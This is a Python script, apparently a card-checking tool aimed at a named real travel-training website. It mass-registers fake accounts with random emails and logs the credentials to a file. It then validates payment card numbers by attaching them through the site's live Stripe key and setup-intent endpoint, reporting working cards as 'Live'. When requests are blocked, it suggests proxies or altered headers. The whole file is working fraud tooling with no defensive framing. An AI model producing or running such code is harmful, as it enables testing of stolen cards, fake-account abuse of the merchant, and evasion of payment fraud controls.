import requests
import re
import random
import time
import string
from bs4 import BeautifulSoup
import logging
import requests
import re
import random
import string
from bs4 import BeautifulSoup
import requests
import re
import random
import string
from bs4 import BeautifulSoup

def generate_random_email(length=8, domain=None):
    """Generates a random email address."""
    common_domains = ["gmail.com", "yahoo.com", "outlook.com"]
    if not domain:
        domain = random.choice(common_domains)
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{random_string}@{domain}"

def create_session():
    """Creates a session and registers an account."""
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Referer': 'https://www.thetravelinstitute.com/register/',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})

        if not nonce or not noncee:
            print("❌ Nonce values not found!")
            return None

        nonce = nonce['value']
        noncee = noncee['value']

        data = {
            'afurd_field_nonce': nonce,
            'email': email,
            'password': 'Esahatam2009@',
            'woocommerce-register-nonce': noncee,
            'register': 'Register',
        }

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        response.raise_for_status()

        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(f'{email}:Esahatam2009@\n')
            return session
        else:
            print("❌ Registration failed!")
            return None

    except requests.exceptions.RequestException as e:
        print(f"❌ Error in create_session: {e}")
        return None

def Tele(ccx):
    """Handles payment method addition and Stripe API interaction."""
    ccx = ccx.strip()

    try:
        parts = ccx.split("|")
        if len(parts) < 4:
            raise ValueError("Invalid input format. Expected format: CardNumber|Month|Year|CVC")
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

        if not (1 <= int(mm) <= 12):
            raise ValueError("Invalid month (must be 1-12).")
        if len(yy) == 4:
            yy = yy[-2:]
        if len(cvc) not in [3, 4]:
            raise ValueError("Invalid CVC length (must be 3 or 4 digits).")

    except ValueError as e:
        print(f"❌ Error: {e} - Input: {ccx}")
        return None

    session = requests.Session()

    try:
        # Fetch nonce for payment method addition
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
        }

        response = session.get(
            'https://www.thetravelinstitute.com/my-account/add-payment-method/',
            headers=headers,
            timeout=20
        )
        response.raise_for_status()

        # Extract nonce
        html = response.text
        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
        if not nonce_match:
            print("❌ Error: Nonce not found on payment page.")
            return None
        nonce = nonce_match.group(1)

        # Stripe API request
        stripe_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }

        stripe_data = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        }

        stripe_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=20
        )
        stripe_response.raise_for_status()
        stripe_data = stripe_response.json()

        # Final request to confirm setup intent
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        form_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': stripe_data.get('id', ''),
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        final_response = session.post(
            'https://www.thetravelinstitute.com/',
            params=params,
            data=form_data,
            timeout=20
        )

        if final_response.status_code == 403:
            print("🚫 403 Forbidden: Your request was blocked. Try using a proxy or updating headers.")
            return None

        final_response.raise_for_status()
        
        return final_response.json().get('msg', '✅ Live')

    except requests.exceptions.RequestException as e:
        print(f"❌ Request failed: {e}")
        return None

# Example usage:
# session = create_session()
# if session:
#     print("✅ Session created successfully!")

# result = Tele("4242424242424242|12|2026|123")
# print(result)

